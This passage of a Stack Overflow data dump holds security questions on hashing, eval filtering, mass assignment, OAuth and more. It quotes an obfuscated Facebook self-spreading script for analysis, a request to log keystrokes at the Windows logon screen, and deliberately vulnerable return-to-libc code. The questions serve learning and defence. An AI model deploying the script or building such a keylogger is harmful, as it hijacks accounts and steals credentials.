href=\"http://csrc.nist.gov/groups/ST/hash/sha-3/index.html\">SHA-3</a>) that is still being worked on.</p>\n\n<p>The 'value that is unique to the DBMS server instance' need not be secret - though it wouldn't be divulged casually.  The intention is to ensure that if someone uses the same password in different DBMS server instances, the recorded hashes would be different. Likewise, the user name would not be secret - just the password proper.</p>\n\n<p>Would there be any advantage to having the password first and the user name and 'unique value' second, or any other permutation of the three sources of data?  Or what about interleaving the strings?</p>\n\n<p>Do I need to add (and record) a random salt value (per password) as well as the information above?  (Advantage: the user can re-use a password and still, probably, get a different hash recorded in the database.  Disadvantage: the salt has to be recorded.  I suspect the advantage considerably outweighs the disadvantage.)</p>\n\n<p>There are quite a lot of related SO questions - this list is unlikely to be comprehensive:</p>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/287517/encrypting-hashing-plain-text-passwords-in-database\">Encrypting/Hashing plain text passwords in database</a></li>\n<li><a href=\"http://stackoverflow.com/questions/401656/secure-hash-and-salt-for-php-passwords\">Secure hash and salt for PHP passwords</a></li>\n<li><a href=\"http://stackoverflow.com/questions/213380/the-necessity-of-hiding-the-salt-for-a-hash\">The necessity of hiding the salt for a hash</a></li>\n<li><a href=\"http://stackoverflow.com/questions/348704/client-side-md5-hash-with-time-salt\">Clients-side MD5 hash with time salt</a></li>\n<li><a href=\"http://stackoverflow.com/questions/30946/simple-password-encryption\">Simple password encryption</a></li>\n<li><a href=\"http://stackoverflow.com/questions/1645161/salt-generation-and-open-source-software\">Salt generation and Open Source software</a></li>\n<li><a href=\"http://dba.stackexchange.com/questions/7492/password-hashes-fixed-length-binary-fields-or-single-string-field\">Password hashes: fixed-length binary fields or single string field?</a></li>\n</ul>\n\n<p>I think that the answers to these questions support my algorithm (though if you simply use a random salt, then the 'unique value per server' and username components are less important).</p>\n"},{"tags":["javascript","security","eval","injection","jsfiddle"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12699359,"title":"Which keywords should I filter in eval()?","body":"<p>I need to use eval() for a JavaScript-based web app I'm building. </p>\n\n<p>The reason for this is that I want to let people write their own functions that get stored as text, and can be re-used on the site when then need to use them another time. Think along the lines of jsFiddle.</p>\n\n<p>The code will either be run and eval'ed, or will inserted as a script tag. Either way, it leaves the site open to JavaScript injection by malicious users. As such, I'm planning to either filter submitted code, or when a user loads another user's script, have a warning message that the user should first read / check the script before continuing.</p>\n\n<p>So far, I'm looking to filter / warn on the following keywords:</p>\n\n<pre><code>eval\nexecScript\n\nscript\n\nwindow.*\nsetInterval\nsetTimeout\nalert\nconfirm\nprompt\n\ndocument.*\nwrite\ninnerHTML\ninsertAdjacentHTML\ncreateElement\nappendChild\nsetAttribute\n\nform.*\nsubmit\n\nXMLHttpRequest\n\njQuery.*\najax\n\nbase64encode\nbase64decode\n</code></pre>\n\n<p>I've not started testing yet, so these are only my initial thoughts.</p>\n\n<p>Anyone got experience or opinion on this?</p>\n\n<p>Thanks,\nDave</p>\n"},{"tags":["php","security","suhosin"],"answer_count":3,"favorite_count":3,"up_vote_count":11,"down_vote_count":1,"view_count":1516,"score":10,"question_id":568609,"title":"Why isn't Suhosin part of the PHP core?","body":"<p>It seems Suhosin patches and extends the PHP core as a means to protect users from flaws in the core. It also seems some smart people are using this system. Since it appears to be a good thing, I'm curious as to why its not part of the PHP core to begin with. Anybody know?</p>\n\n<p><strong>Update:</strong> Apparently some distributions of Linux also package PHP with Suhosin by default. This seems to be true for Debian (Lenny at least) and Arch Linux. Any other distributions package PHP with Suhosin by default?</p>\n"},{"tags":["ios","ipad","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12661227,"title":"Check for device lock and validate certificate","body":"<p>For one of my iOS apps I need to check two things:</p>\n\n<ul>\n<li>Is there an active device lock (pass code)</li>\n<li>Has the device lock been triggered by the correct authority / certificate (e.g. my own certificate). This is required to assure specific security guidelines.</li>\n</ul>\n\n<p>For the first part of my question I found <a href=\"http://stackoverflow.com/a/6195643\">this</a> answer - which is sufficient for me. How would you accomplish the second part?</p>\n"},{"tags":["php","security","file","escaping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12690763,"title":"Escape a valid filename/path","body":"<p>So i'm getting into security problems right now, and i want to know what is the perfect approach in making scripts safe. I have somewhere in my code this</p>\n\n<pre><code>$AdditionalPath = preg_replace(\"/^[A-Za-z0-9._-\\/\\\\]/\",\"\",$AdditionalPath);\nrequire $AdditionalPath.\"../xdata/php/website_config/mysql.php\";\n</code></pre>\n\n<p><code>$AdditionalPath</code> may be everything, even a malicious code, so i tough to myself that i should let certain characters into that variable, like <code>A-Z</code> <code>a-z</code> <code>0-9</code> <code>.</code> <code>/</code> <code>\\</code> . I'm i correct? And also did i made this regex correctly?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","windows-desktop-gadgets","gadget"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":301,"score":1,"question_id":11490844,"title":"What's the \"gadget vulnerability\"?","body":"<p>In a recent security advisory, Microsoft warns that \"<em>Vulnerabilities in Gadgets Could Allow Remote Code Execution</em>\":</p>\n\n<blockquote>\n  <p>An attacker who successfully exploited a Gadget vulnerability could run arbitrary code in the context of the current user.</p>\n</blockquote>\n\n<p>(<a href=\"http://technet.microsoft.com/en-us/security/advisory/2719662\" rel=\"nofollow\">Microsoft Security Advisory 2719662</a>)</p>\n\n<hr>\n\n<p>I don't really understand the point. As far as I know, gadgets are (by design) HTML-based application running with full trust!</p>\n\n<blockquote>\n  <p><strong>Full Trust</strong></p>\n  \n  <p>The choice to run a gadget is presented to the user in the same way that the choice to run any application downloaded from the Internet is presented. Information about the author of the gadget is displayed in a dialog box that indicates there is risk associated with this file. After the user accepts the warning, the gadget will run with all of the permissions associated with the user's login account.</p>\n</blockquote>\n\n<p>(<a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ff486358.aspx#_sidebar_overview_fulltrust\" rel=\"nofollow\">MSDN: Gadgets for Windows Sidebar Security</a>)</p>\n\n<p>For example, nothing prevents you from adding</p>\n\n<pre><code>&lt;script language=\"VBScript\"&gt; \n    Set shell = CreateObject(\"Wscript.Shell\")\n    shell.Run \"notepad.exe\"\n&lt;/script&gt; \n</code></pre>\n\n<p>and executing arbitrary commands from your gadget. <a href=\"http://blogs.technet.com/b/heyscriptingguy/archive/2005/10/31/how-can-i-start-an-application-from-an-hta.aspx\" rel=\"nofollow\">This works and it's by design.</a></p>\n\n<p>Obviously, they can do everything that another application running in the local user's context can do. So, where is the <em>vulnerability</em> the MS Security Advisory is mentioning which \"can be exploited\"?</p>\n"},{"tags":["java","security","policy","javapolicy"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":12696365,"title":"Loading Desired Policy Implementation in JVM (Loading the value of policy.provider in Java security properties file)","body":"<p>According to the <a href=\"http://docs.oracle.com/javase/6/docs/api/java/security/Policy.html\" rel=\"nofollow\">documentation</a>, the default Policy implementation can be changed by setting the value of the \"policy.provider\" security property (in the Java security properties file) to the fully qualified name of the desired Policy subclass implementation.</p>\n\n<p>I created my own implementation of the policy provider class and did the changes accordingly to the Java security properties file. But the class didn't get loaded . After bit researching I came across this <a href=\"http://www.tedneward.com/files/Papers/JavaPolicy/JavaPolicy.pdf\" rel=\"nofollow\">whitepaper</a>,which says simply \"create a \"classes\" directory under the \"jre\" directory and place the Policy implementation there. Now the bootstrap ClassLoader will pick up the MyPolicy implementation\". Though I tried that still it ws a failure.</p>\n\n<p>How can I make my policy implementation available to the bootstrap ClassLoader for the successful loading?</p>\n"},{"tags":["java","windows","security","login","keyboard-input"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12674056,"title":"Trap keyboard input from windows logon screen ","body":"<p>I want to do following things to be done my Java project:-</p>\n\n<ol>\n<li>Lock Windows desktop.</li>\n<li>Detect key press event when windows desktop is locked.</li>\n<li>Save entered keys from keyboard in a text file.</li>\n</ol>\n\n<p>First step is done using this code: </p>\n\n<pre><code>Runtime rt = Runtime.getRuntime();\nProcess pr = rt.exec(\"C:\\\\Windows\\\\System32\\\\rundll32.exe user32.dll,LockWorkStation\");\n</code></pre>\n\n<p>Please someone help me out from this problem...</p>\n"},{"tags":["ruby-on-rails","security","devise"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12356327,"title":"Security - Filter attributes when creating user with Devise","body":"<p>My concern is about the possibility for a malicious user to add an extra parameter when he registers on my site. I'm using Rails 3.2.8 and Devise 2.1.2. I have a class <code>User</code> with an <code>admin</code> attribute</p>\n\n<p><em>user.rb</em> </p>\n\n<pre><code>class User &lt; ActiveRecord::Base\n  devise :database_authenticatable, :registerable, :recoverable, :trackable,\n     :validatable, :token_authenticatable, :lockable\nend\n</code></pre>\n\n<p><em>schema.rb</em></p>\n\n<pre><code>create_table \"users\", :force =&gt; true do |t|\n  t.boolean  \"admin\"\n  t.string   \"email\",                                  :null =&gt; false\n  t.string   \"encrypted_password\",     :default =&gt; \"\", :null =&gt; false\n  # other devise columns are not relevant for the question...\nend\n</code></pre>\n\n<p>I'm using the provided <code>Devise::RegistrationsController</code> for the registration of a User, and a custom view with <code>email</code> and <code>password</code>:</p>\n\n<pre><code>&lt;%= form_for(resource, :as =&gt; resource_name, :url =&gt; registration_path(resource_name)) do |f| %&gt;\n  &lt;%= devise_error_messages! %&gt;\n\n  &lt;div class=\"form_line\"&gt;\n    &lt;%= f.label :email, 'Email' %&gt;\n    &lt;%= f.email_field :email %&gt;\n  &lt;/div&gt;\n  &lt;div class=\"form_line\"&gt;\n    &lt;%= f.label :password, 'Password' %&gt;\n    &lt;%= f.password_field :password %&gt;\n  &lt;/div&gt;\n  &lt;div class=\"form_line\"&gt;\n    &lt;%= f.label :password_confirmation, 'Password confirmation' %&gt;\n    &lt;%= f.password_field :password_confirmation %&gt;\n  &lt;/div&gt;\n\n  &lt;div class=\"actions\"&gt;\n    &lt;%= f.submit \"Register\", class: 'button' %&gt;\n  &lt;/div&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>I works perfectly, but a if a malicious user adds a parameter <code>admin</code> with value <code>true</code> in the post request, the user is created with the admin privileges. </p>\n\n<pre><code>Started POST \"/users\" for 127.0.0.1 at 2012-09-10 18:46:15 +0200\nProcessing by RegistrationsController#create as HTML\n  Parameters: { \"user\"=&gt;{\"email\"=&gt;\"test@example.com\", \"password\"=&gt;\"[FILTERED]\", \"password_confirmation\"=&gt;\"[FILTERED]\", \"admin\"=&gt;\"true\" }\n</code></pre>\n\n<p>That's a security weakness in my site. Can I configure Devise to ignore extra parameters (I need only email and password) when a user registers (or updates its profile, I think I'll have the same problem) ? If it's not possible, is there another solution ?</p>\n"},{"tags":["linux","security","centos"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":29,"score":0,"question_id":12695008,"title":"How can I check the history of my centos VPS? Linux","body":"<p>I'm about to hand out my root server password to a company for them to fix an issue that I have with mydns.</p>\n\n<p>I'm sure they are all above board (and I will change the root password after they have finished) but I just want to be sure.</p>\n\n<p>I know (well I think) I can login after them and execute <code>history</code> to see what they did, but I know if they are dishonest, they can just clear the history. I'm worried in case a rogue employee does something malicious or installs keylogging software (which has happened when my mate let another company manage his VPS).</p>\n\n<p>So is there anything I can do? Does the history command backup somewhere? Can I install a keylogger to verify the commands they execute are not malicious?</p>\n\n<p>Any ideas welcome. Ideally I appreciate I shouldn't give out my root password if I don't trust them. But I am in a very difficult situation and have no choice. </p>\n"},{"tags":["android","security","piracy"],"answer_count":2,"favorite_count":3,"up_vote_count":10,"down_vote_count":0,"view_count":375,"score":10,"question_id":9498015,"title":"How should I code to resist \"one-click piracy\"?","body":"<p>The app I am working on is automatically cracked by antiLVL (although I am not using the LVL in my app).</p>\n\n<p>In order of protecting my app from \"one-click piracy\", I am implementing <a href=\"http://www.google.com/events/io/2011/sessions/evading-pirates-and-stopping-vampires-using-license-verification-library-in-app-billing-and-app-engine.html\">tampering detection techniques explained at Google IO</a>.</p>\n\n<p>I have tried checking the signature both with <code>getPackageInfo()</code> and reflection (<code>invoke()</code>), but AntiLVL was able to crack the app automatically in both cases.</p>\n\n<p>How can I write code that will not be automatically cracked by the current version of antiLVL (1.4.0)? I mean, apart from using JNI.</p>\n\n<p>PS: I am not talking about preventing piracy in general. I just want the pirate to dig into the code by hand rather than using an automatic cracker.</p>\n"},{"tags":["javascript","security","internet-explorer-9"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":522,"score":1,"question_id":8317725,"title":"IE9 \"Can't execute code from freed script\" when calling hasOwnProperty()","body":"<p>Here is the scenario:</p>\n\n<p>I have a container page that swaps iFrames in and out to show different content. All iFrames come from the same domain. https is enabled.</p>\n\n<ul>\n<li>The container page has an object called Flow, with functions set/getParameter</li>\n<li>The first iFrame, s0-welcome, creates an object, data, and calls Flow.setParameter('data', data);</li>\n<li>The container then replaces the first iFrame with a second iFrame, s1-transfer. </li>\n<li>The s1-transfer calls Flow.getParameter('data') and stores it in a local variable s1data</li>\n</ul>\n\n<p>In the IE9 debug tools console, if I type s1data it shows me all the properties of that object. However, if I call s1data.hasOwnProperty('prop1'), I get a \"Can't execute code from a freed script\" error. If I call Object.prototype.hasOwnProperty.call(s1data, \"prop1\"), everything works fine.</p>\n\n<p>It looks to me that there can be 2 possibilities:</p>\n\n<p>1) Container page holds on to the reference from the first iFrame, but when the first iFrame gets disposed, it loses some of the data. This seems unlikely since the only thing I can't access is functions</p>\n\n<p>2) There is a security restriction that does not allow one iFrame to run code related to another iFrame even if both iFrames are from the same domain.</p>\n\n<p>Any thoughts?</p>\n"},{"tags":["javascript","security"],"answer_count":3,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":3216,"score":6,"question_id":2634159,"title":"Javascript in the address bar - is this malicious? ","body":"<p>I got a message on Facebook telling me to copy and paste this into my address bar. I thought I'd post it here and see what everyone thinks about it. What does it do? How does it work? </p>\n\n<p>Here's the source code: </p>\n\n<pre><code>// (DO NOT DO THIS!)\nJavascript:var a=[\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\",\"\\x61\\x70\\x70\\x34\\x39\\x34\\x39\\x37\\x35\\x32\\x38\\x37\\x38\\x5F\\x61\\x70\\x70\\x34\\x39\\x34\\x39\\x37\\x35\\x32\\x38\\x37\\x38\\x5F\\x64\\x64\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x3C\\x61\\x20\\x69\\x64\\x3D\\x22\\x73\\x75\\x67\\x67\\x65\\x73\\x74\\x22\\x20\\x68\\x72\\x65\\x66\\x3D\\x22\\x23\\x22\\x20\\x61\\x6A\\x61\\x78\\x69\\x66\\x79\\x3D\\x22\\x2F\\x61\\x6A\\x61\\x78\\x2F\\x73\\x6F\\x63\\x69\\x61\\x6C\\x5F\\x67\\x72\\x61\\x70\\x68\\x2F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2E\\x70\\x68\\x70\\x3F\\x63\\x6C\\x61\\x73\\x73\\x3D\\x46\\x61\\x6E\\x4D\\x61\\x6E\\x61\\x67\\x65\\x72\\x26\\x61\\x6D\\x70\\x3B\\x6E\\x6F\\x64\\x65\\x5F\\x69\\x64\\x3D\\x31\\x31\\x32\\x36\\x38\\x32\\x36\\x39\\x35\\x34\\x31\\x38\\x35\\x32\\x33\\x22\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x20\\x70\\x72\\x6F\\x66\\x69\\x6C\\x65\\x5F\\x61\\x63\\x74\\x69\\x6F\\x6E\\x20\\x61\\x63\\x74\\x69\\x6F\\x6E\\x73\\x70\\x72\\x6F\\x5F\\x61\\x22\\x20\\x72\\x65\\x6C\\x3D\\x22\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2D\\x70\\x6F\\x73\\x74\\x22\\x3E\\x53\\x75\\x67\\x67\\x65\\x73\\x74\\x20\\x74\\x6F\\x20\\x46\\x72\\x69\\x65\\x6E\\x64\\x73\\x3C\\x2F\\x61\\x3E\",\"\\x73\\x75\\x67\\x67\\x65\\x73\\x74\",\"\\x4D\\x6F\\x75\\x73\\x65\\x45\\x76\\x65\\x6E\\x74\\x73\",\"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x76\\x65\\x6E\\x74\",\"\\x63\\x6C\\x69\\x63\\x6B\",\"\\x69\\x6E\\x69\\x74\\x45\\x76\\x65\\x6E\\x74\",\"\\x64\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x45\\x76\\x65\\x6E\\x74\",\"\\x73\\x65\\x6C\\x65\\x63\\x74\\x5F\\x61\\x6C\\x6C\",\"\\x73\\x67\\x6D\\x5F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x66\\x6F\\x72\\x6D\",\"\\x2F\\x61\\x6A\\x61\\x78\\x2F\\x73\\x6F\\x63\\x69\\x61\\x6C\\x5F\\x67\\x72\\x61\\x70\\x68\\x2F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2E\\x70\\x68\\x70\",\"\\x73\\x75\\x62\\x6D\\x69\\x74\\x44\\x69\\x61\\x6C\\x6F\\x67\"];\nvoid (document[a[2]](a[1])[a[0]]=a[3]);var ss=document[a[2]](a[4]);\nvar c=document[a[6]](a[5]);\nc[a[8]](a[7],true,true);\nvoid (ss[a[9]](c));\nvoid (setTimeout(function (){fs[a[10]]();} ,4000));\nvoid (setTimeout(function (){SocialGraphManager[a[13]](a[11],a[12]);} ,5000));\nvoid (setTimeout(function (){\ndocument[a[2]](a[1])[a[0]]=\"\\x3C\\x61\\x20\\x68\\x72\\x65\\x66\\x3D\\x27\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x62\\x69\\x74\\x2E\\x6C\\x79\\x2F\\x62\\x54\\x6C\\x30\\x76\\x6A\\x27\\x3E\\x43\\x6F\\x6D\\x70\\x6C\\x65\\x74\\x65\\x64\\x21\\x20\\x43\\x6C\\x69\\x63\\x6B\\x20\\x68\\x65\\x72\\x65\\x3C\\x2F\\x61\\x3E\";\n} ,5400));\n</code></pre>\n"},{"tags":["security","oauth"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12692869,"title":"Oauth: Does the same consumer key/secret generate the same oauth token and token secret for each account being authorized?","body":"<p>The scenario is basically two different users authorizing the same account using oauth. Are they guranteed to have the same token &amp; token-secret?</p>\n\n<p>It seems like it does with twitter and maybe linkedin. I would like to know if this is by design or just particular to twitter.</p>\n"},{"tags":["facebook","flash","security","actionscript"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12671759,"title":"Flash ActionScript 3 get auth info within single SWF","body":"<p>I am developing flash application as single <code>swf</code> file, without HTML wrapper (but for sure I have this swf located at my hosting). I have create application at developers section. The problem I have faced is: when I post this SWF to the my wall at FaceBook I can not get any call from this SWF of the <code>URLloader</code> or <code>ExternalItreface</code>. </p>\n\n<p>For example, I need to do <a href=\"http://developers.facebook.com/docs/authentication/signed_request/\" rel=\"nofollow\">Signed Request</a> in order to get user information but I have got <em>Security Error</em> which say that my domain cannot get information from apps.facebook.com</p>\n\n<p>The request I am doing is a simple:</p>\n\n<pre><code>var urlRequest:URLRequest = new URLRequest(\"http://apps.facebook.com/my_app_name\");\n</code></pre>\n\n<p>Is there any way to inform faceebok that my hosting is a security save?</p>\n"},{"tags":["facebook","security","database-design"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":385,"score":1,"question_id":9450317,"title":"Facebook photo renaming convention","body":"<p>When we upload any photo to Facebook it is renamed by Facebook. The new name generally has the following pattern: \n393268_10151029983750034_598680033_21778114_899520598_n.jpg</p>\n\n<p>This name can be split with underscore in 6 parts.</p>\n\n<ol>\n<li>I know that the second number in the name is the fbid of the photo and you can access the photo directly in Facebook with: <a href=\"https://www.facebook.com/photo.php?fbid=10151029983750034\" rel=\"nofollow\">https://www.facebook.com/photo.php?fbid=10151029983750034</a> provided you have the necessary permissions.</li>\n<li>The third number is the Facebook profile id of the uploader of the photo. You can go to the profile of the uploader by: <a href=\"https://www.facebook.com/profile.php?id=598680033\" rel=\"nofollow\">https://www.facebook.com/profile.php?id=598680033</a></li>\n</ol>\n\n<p>I have the following questions regarding this naming convention:</p>\n\n<ol>\n<li>Does anyone know what other information is present in the name of the photo? Is the information about the shards/node/bucket to which the photo belongs present in the photo name?</li>\n<li>What are the advantages/disadvantages of such a naming convention?</li>\n</ol>\n"},{"tags":["django","security","api","tastypie"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12689311,"title":"Security using Tastypie in Mobile Devices Best practices","body":"<p>Which is the best way to use Django / Python Tastypie to build and API for mobile devices?</p>\n\n<p>What I want to do is:</p>\n\n<ul>\n<li>People connection to some api.domain.com/dosomething/</li>\n<li>I would like that people could identify themselves without cookies.</li>\n<li>I want something more or less secure ( I am afraid people could look into the code to find some API_SECRET )</li>\n</ul>\n\n<p>Is tastypie a good option? Any idea?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","computer-science","discrete-mathematics","ciphers"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":1131,"score":0,"question_id":1722908,"title":"multiplicative inverse?","body":"<p>I know that an affine cipher substitutes BD with SG. I need to find the encryption formula, in the form <code>y = a x + b</code>, where a and b are coefficients.\nFrom the information above I end up having to equations:\n<code>a+b=18</code> and\n<code>3a+b=6</code>\nSo I am working like this:\n<code>a+b=18</code> and <code>3a + b = 6-&gt; 3a+18-a=6-&gt;  2a= 6-18 -&gt; 2a=14 </code>(cuz it is mod 26)</p>\n\n<p><code>b=18-a </code></p>\n\n<p><code>2a=?</code> So, O want to multiply by the multiplicative inverse of  2 mod 26</p>\n\n<p>I can't find a multiplicative inverse of number 2 with 26 (<code>y = ax + b mod 26</code>)</p>\n\n<p>Can anyone please help me find a and b???</p>\n"},{"tags":["security","fingerprint"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":101,"score":5,"question_id":12627765,"title":"Convert Finger Print image to comparable template","body":"<p>I have a finger print scanner which gives me only an image of finger-print(it's SDK doesn't provide any functionality for \"converting\" them into template and for comparing these templates).\nMy question is which approach should I use: look for an SDK which does provide functionality for converting and comparing finger-print images, or shpuld I write these algorithms on my own(which  seems hard and time consuming). If first method is preferred, What are open source/paid sdk's for that work? Can you give me some links</p>\n\n<p>My device is Verifier 300 LC.</p>\n\n<p>Thanx in advance :)</p>\n"},{"tags":["php","security","hash","passwords"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":99,"score":6,"question_id":12459896,"title":"password_compat for older php version","body":"<p>PHP 5.5 will <a href=\"https://wiki.php.net/rfc/password_hash\">support</a> the password functions <code>password_hash()</code> and <code>password_verify()</code>. Also there is a <a href=\"https://github.com/ircmaxell/password_compat\">file</a> to add this functions in >5.3.7.</p>\n\n<p>My problem is that I am currently running the debian package 5.3.3-7+squeeze14.</p>\n\n<p>Is there a way to make this function available with this old PHP version?</p>\n"},{"tags":["wcf","web-services","security","iis"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":125,"score":3,"question_id":10757463,"title":"Internal WCF Service on a public facing server security","body":"<p>I need to host a WCF service that will give its clients access to internal business systems on a public facing web server. Obviously I must secure this so that no one from the outside world even knows the service exists, let alone be able to call methods and access the data it exposes.</p>\n\n<p>The overall idea is that the public facing website hosted on the same machine will call the WCF service and then the WCF service will provide it with the required data...</p>\n\n<p><code>Public Facing Web Site &lt;-&gt; WCF Service &lt;-&gt; Business Systems / Databases</code></p>\n\n<p>So I need to understand how to secure the service so it can only be accessed via the public facing website.</p>\n\n<p>Ideas I had..</p>\n\n<ul>\n<li>IIS filtering so that the IIS Site hosting the WCF service will only accept requests from a certain IP address.</li>\n<li>Obscure port that will not be allowed through the public facing firewall.</li>\n<li>Protocol such as NetTCP or NamedPipes</li>\n</ul>\n\n<p>But what about the actual WCF security set up? As both the Public Facing Site and the service are on the same machine is Windows Authentication as option? Questions I have regarding this are...</p>\n\n<ul>\n<li><p>Should the service client and the service simply use Windows Authentication?</p></li>\n<li><p>Do I need specific user accounts as opposed to Network Service? If the website runs under network service would this then automatically authenticate to the service?</p></li>\n</ul>\n\n<p>My objective is that someone in the outside world should not know of the services existance or be able to make access to it.</p>\n\n<p>Thanks in advance.</p>\n\n<p>Technical environment is: IIS7, .Net 4 and WCF 4.</p>\n"},{"tags":["security","authentication","google","oauth","openid"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12679267,"title":"Handle OAuth signup/login when email exist","body":"<p>Problem assumptions/conditions:</p>\n\n<ol>\n<li>There exists a user with email <code>foo@bar.com</code> (unverified) in the system.</li>\n<li>Visitor is not signed into the system (no current session, e.g. new browser).</li>\n<li>Visitor signup/login using Google Account, through OAuth (user authorizes).</li>\n<li>The system receives callback with uid and the email <code>foo@bar.com</code> [verified by Google].</li>\n</ol>\n\n<p>I see three options here:</p>\n\n<p>A. Sign in the visitor to the existing account with email foo@bar.com. This have some security implications.</p>\n\n<p>B. Ask for a password [assuming there is a password in the system, this may not be the case with multiple OAuth providers] and sign them into existing account if it's valid.</p>\n\n<p>C. Reject the login/signup, say email is already used, encourage user to login before connecting with Google.</p>\n\n<p><strong>What are the security risks with option #A?</strong></p>\n\n<p><em>What I've come up with myself:</em></p>\n\n<p>'Anticipation attacks' could be performed, where an attacker anticipates a signup and creates an account on the system before the target does. After the target has signed up using OAuth he will have an active session on that account. Would be defeated by clearing all sessions on the account before doing #A.</p>\n"},{"tags":["php","security","node.js","authentication","socket.io"],"answer_count":2,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":402,"score":6,"question_id":12192957,"title":"PHP + socket.io (session, authorizing and security problems)","body":"<p>I have a working php application in which I want to add real-time support. I would like to use nodejs/socket.io to add that kind of functionality. \n<br/><br/>\nFirst problem I found was how to properly authorize user on nodejs side (user is already authenticated on php backend through PHP session). Using <strong>socket.handshake.header.cookie</strong> on nodejs side i can parse and get PHP session id, which I can authenticate through redis/memcache/database (depending on what have I used to save session information).<br/> Everything looks cool when user has only one tab/window of the site opened - when having more and using <strong>session_regenerate_id()</strong>, in nodejs the user authenticates with another sessionid key, so I cannot distinguish two tabs by anything other than the socket id they connected with. When user logouts he shouldn't be getting any messages on any tab (because he already logged out on every tab/window from that browser). So on logout message (sent from browser just before the logout PHP things) I should remove all the socket connections connected to the authorized user id. But what if user logges in on two devices (fe. pc browser and an ipad safaris). After logout on one device, he shouldn't be getting any messages on the device he logged out, not on every device. <strong>How can i distinguish connections from different devices/browsers in socket.io?</strong> Of course not using <strong>session_regenerate_id()</strong> would be efficent here, but what can I do if I really want to use this feature?\n<br/><br/>\nAnother problem I have is rather a security issue (or even question). Let's assume that authorized user in application can see page <strong>example.com/user1</strong> (which is a news feed for user1) and cannot see <strong>example.com/user2</strong> (fe. he doesn't have rights to see it). I'd like socket.io to send update messages to browser when user is on <strong>example.com/user1</strong>, and of course not to send when user is on <strong>example.com/user2</strong> site. On socket.io side I can read the referer address (so presumably, when user is on user2 site he does not get any socket.io connection). The question is: <strong>should I compare the referer address with the rights of authenticated user on node.js side? Or maybe the referer value is <em>safe</em> on the node.js side?</strong> Adding another db check on node.js side would slow it down (because almost every request there should be same database check on two sides - PHP and node.js).\n<br/><br/>\nOr maybe the whole concept of socket.io + PHP application working the way I presented is wrong? </p>\n\n<p><strong>UPDATE</strong>\n<br/><br/>\nI think I found a way to omit problems with the first question - basically I just add another cookie (besides PHPSESSID) fe. named NODESESSID, which I generate (fe. using uniqid()) when user is authorized. Now authorization on node.js side is comparing PHPSESSID and NODESESSID (both must match). Now, when user logges out he delivers the message <em>logout</em> to socket.io and socket.io disconnects all the sockets with NODESESSID. This is like connecting the benefits of regenerating session id and not regenerating session id (but is not vulnerable to session fixation, isn't it?). </p>\n"},{"tags":["c","security","buffer-overflow","libc"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12340262,"title":"(Another) Return to Libc Attack: Won't Segfault or Return to Libc With Malicious Input. Works in GDB though","body":"<p>I'd like to learn how return to libc attacks work, so I have written a vulnerable program so that I can change the return address of a function to that of <code>system()</code>. However, the program doesn't appear to call <code>system()</code> and exits cleanly.</p>\n\n<h2>Prerequisites</h2>\n\n<p><strong>-</strong> I'm using Debain Squeeze</p>\n\n<p><strong>-</strong> I have disabled address randomization with:</p>\n\n<pre><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space\n</code></pre>\n\n<h2>Vulnerable Code</h2>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid someFunc(void);\n\nvoid someFunc(void){\n    char buffer[64];\n\n    gets(buffer);\n    //puts(buffer);\n}\n\nint main(int argc, char **argv)\n{\n    someFunc();\n    return 0;\n}\n</code></pre>\n\n<p>The code is compiled with:</p>\n\n<pre><code>gcc -fno-stack-protector -ggdb -o vuln vuln.c\n</code></pre>\n\n<p>Using GDB I have asserted that:</p>\n\n<ol>\n<li><code>/bin/zsh</code> is @ 